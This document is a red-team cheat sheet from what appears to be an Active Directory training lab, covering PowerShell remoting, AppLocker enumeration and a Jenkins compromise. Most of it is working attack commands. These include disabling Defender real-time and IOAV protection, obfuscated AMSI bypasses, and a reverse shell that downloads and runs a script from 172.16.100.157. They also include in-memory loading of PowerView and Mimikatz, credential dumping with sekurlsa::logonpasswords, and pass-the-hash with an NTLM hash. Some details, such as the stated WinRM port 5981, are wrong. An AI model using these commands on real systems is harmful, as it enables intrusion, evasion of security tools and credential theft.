# Antivirus & Detections

## Windows Defender

### Check Status of Defender

- **PowerShell Commands:**
  ```powershell
  Get-MpComputerStatus
  ```

- **Firewall Status Commands:**
  ```powershell
  netsh advfirewall show domain
  netsh advfirewall show private
  netsh advfirewall show public
  ```

### Disable Real-Time Monitoring

- **PowerShell Command:**
  ```powershell
  Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
  ```

- **Disable IOAV Protection:**
  ```powershell
  Set-MpPreference -DisableIOAVProtection $true
  ```

---

# PowerShell Remoting (PS-Remoting)

## Ports
- Port number for WSMan or WinRM is 5981.
- Port number for SSL is 5986.
- PowerShell remoting port 5985 is the default for HTTP and HTTPS.

## Types of PowerShell Remoting
1. One to One
2. One to Many

# One to Many - New PSSession

## Create a New PSSession and Enter It
```powershell
PS C:\AD\Tools> $sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
PS C:\AD\Tools> $sess

 Id Name        ComputerName        ComputerType     State      ConfigurationName    Availability
 -- ----        ------------        ------------     -----      -----------------    ------------
  1 Session1    dcorp-adminsrv      RemoteMachine    Opened     Microsoft.PowerShell Available

PS C:\AD\Tools> Enter-PSSession -Session $sess
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> $proc = Get-Process
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> exit
PS C:\AD\Tools> Enter-PSSession -Session $sess
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> $proc
```

# One to One - Enter-PSSession
- Interactive
- Runs in a new process (`wsmprovhost`)
- Is Stateful

## Enter a PSSession
```powershell
PS C:\AD\Tools> Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> whoami /priv

enter-pssession -computername ad -credential domain-lab\Administrator
```

# Script Execution

## Invoke-Command | Function Load | File Load

### Execute Scripts
```powershell
PS C:\AD\Tools> Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}
PS C:\AD\Tools> Invoke-Command -ComputerName (Get-Content .\computers.txt) -ScriptBlock {whoami;hostname}
```

### Execute Functions
```powershell
PS C:\Users\student157\Desktop> hello
PS C:\Users\student157\Desktop> Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock ${function:hello}
PS C:\Users\student157\Desktop> cat .\hello.ps1

function hello {
    Write-Host "Hello World! from function"
}
```

### Execute File
```powershell
PS C:\Users\student157\Desktop> $sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
PS C:\Users\student157\Desktop> Invoke-Command -FilePath C:\Users\student157\Desktop\hello.ps1 -Session $sess
PS C:\Users\student157\Desktop> Enter-PSSession -Session $sess
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student157\Documents> hello
```

# Language Mode

## Constrained
- Default cmdlets only work in PowerShell.
- .NET classes and type accelerators are not available.
- Configured in AppLocker.

### Check Language Mode in Constrained Environment
```powershell
PS C:\AD\Tools> Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}
```

## Full
### Check Language Mode in Full Environment
```powershell
PS C:\Users\Lenovo> $ExecutionContext.SessionState.LanguageMode
```

## Passing Arguments in Invoke-Command
Only positional arguments could be passed this way.
```powershell
Invoke-Command -ScriptBlock ${function:GetPassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```

This format should make the commands more organized and easier to read and paste into GitHub!
```



## AppLocker Enumeration

### With the GPO

- Registry Key Location: 
  ```
  HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2
  ```
  - Keys: `Appx`, `Dll`, `Exe`, `Msi`, and `Script`.

### List AppLocker Rules

- **PowerShell Command:**
  ```powershell
  $a = Get-ApplockerPolicy -effective
  $a.rulecollections
  ```

---

## PowerShell

### Default PowerShell Locations in a Windows System

- `C:\windows\syswow64\windowspowershell\v1.0\powershell`
- `C:\Windows\System32\WindowsPowerShell\v1.0\powershell`

### Example of AMSI Bypass

- **PowerShell Command:**
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
  ```

---

## Default Writeable Folders
```
- `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
- `C:\Windows\System32\spool\drivers\color`
- `C:\Windows\Tasks`
- `C:\windows\tracing`
```

# Jenkins Shell Compromise

## Reverse Shell from Jenkins
```powershell
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.157/re_shell.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.157 -Port 443
```

## Bypass Anti-Virus
```powershell
sET-ItEM ('V'+'aR' + 'IA' + 'blE:1q2' + 'uZx') ([TYpE]("{1}{0}" -f 'F','rE'));(GeT-VariaBle("1Q2U"+"zX") -VaL).""A`ss`Embly"".""GET`TY`Pe""((""{6}{3}{1}{4}{2}{0}{5}"" -f'Util','A','Amsi','.Management.','utomation.','s','System')).""g`etf`iElD""(("{0}{2}{1}" -f 'amsi','d','InitFaile'),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,')).""sE`T`VaLUE""(${n`ULl},${t`RuE})
```

## Load PowerView Module in Memory
```powershell
iex (iwr http://172.16.100.157/PowerView.ps1 -UseBasicParsing)
```

## Verify with PowerView Command
```powershell
get-help Invoke-UserHunter
```

## Execute Commands on Remote Machine
```powershell
PS C:\Program Files (x86)\Jenkins\workspace\project0> Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}
PS C:\Program Files (x86)\Jenkins\workspace\project0> whoami
```

## Load Mimikatz and Dump Hashes
```powershell
iex (iwr http://172.16.100.157/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

## Create a New PSSession
```powershell
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

# Active Session and Dump Hashes

## Check Access and Dump Hashes
```powershell
Invoke-UserHunter -checkaccess
Find-LocalAdminAccess
```

# Confirm Local Admin Privileges
```powershell
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
iex (iwr http://172.16.100.157/Invoke-Mimikatz.ps1 -UseBasicParsing)
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

# Dump Hashes Using Mimikatz
```powershell
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

mimikatz(powershell) # sekurlsa::logonpasswords
```

## Pass-the-Hash with Mimikatz
```powershell
Invoke-Mimikatz -Command '""sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe""'
```
